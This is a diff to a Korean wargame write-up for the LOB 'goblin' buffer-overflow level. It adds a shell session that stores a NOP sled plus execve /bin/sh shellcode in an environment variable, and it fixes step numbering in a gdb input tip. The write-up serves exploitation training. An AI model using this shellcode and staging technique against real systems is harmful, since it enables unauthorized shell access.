@@ -51,7 +51,16 @@ buffer배열의 크기가 16Byte로 Shellcode보다 크기가 작으므로 환�
 shell(24byte) = \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
 ```
 
-<img src="http://eliez3r.synology.me/assets/img/writeup/lob/03.goblin/image-20180828135809460.png" width="800px">{:.rounded.shadow}
+```shell
+[cobolt@localhost cobolt]$ export shellcode=`python -c 'print "\x90"*50+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"'`
+[cobolt@localhost cobolt]$ export
+...생략...
+declare -x USER="cobolt"
+declare -x USERNAME=""
+declare -x shellcode="��������������������������������������������������1�Ph//shh/bin��PS�ᙰ
+```
+
+<img src="http://eliez3r.synology.me/assets/img/writeup/lob/03.goblin/01.png" width="800px">{:.rounded.shadow}
 
 `shellcode` 환경변수에 Shellcode를 넣는다.
 
@@ -75,7 +84,7 @@ main(){
 **[!] gdb에서 run 명령 시 user input 주는 방법 1**  
 1) 입력하고나 하는 문자열을 파일로 생성  
 $ python -c 'print "A"*10>tmp  
-1) gdb에서 run 명령어 실행 시 파일 내용 입력   
+2) gdb에서 run 명령어 실행 시 파일 내용 입력   
 (gdb) r<tmp   
 {:.info}
 
